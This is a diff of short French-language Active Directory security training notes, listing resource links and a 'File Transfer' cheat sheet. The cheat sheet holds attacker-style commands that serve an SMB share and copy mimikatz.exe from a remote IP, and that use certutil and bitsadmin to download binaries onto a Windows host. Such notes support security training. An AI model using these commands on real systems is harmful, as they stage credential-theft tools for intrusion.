@@ -4,20 +4,20 @@
 
 # Formation AD Security 101
 
-https://github.com/cfalta/adsec
-https://beta.hackndo.com/
-https://lolbas-project.github.io/
+* https://github.com/cfalta/adsec
+* https://beta.hackndo.com/
+* https://lolbas-project.github.io/
 
 # File Transfer 
 
 ## SMB
 
-sudo python3 smbserver.py ROPNOP /mnt/toto
-net view \\10.9.68.115
-COPY \\10.9.68.115\ROPNOP\mimikatz.exe .
+* sudo python3 smbserver.py ROPNOP /mnt/toto
+* net view \\10.9.68.115
+* COPY \\10.9.68.115\ROPNOP\mimikatz.exe .
 
 ## HTTP
 
-certutil.exe -urlcache -split -f "https://ip/binaire" xxx.exe
-bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\10mb.zip
+* certutil.exe -urlcache -split -f "https://ip/binaire" xxx.exe
+* bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\10mb.zip
 
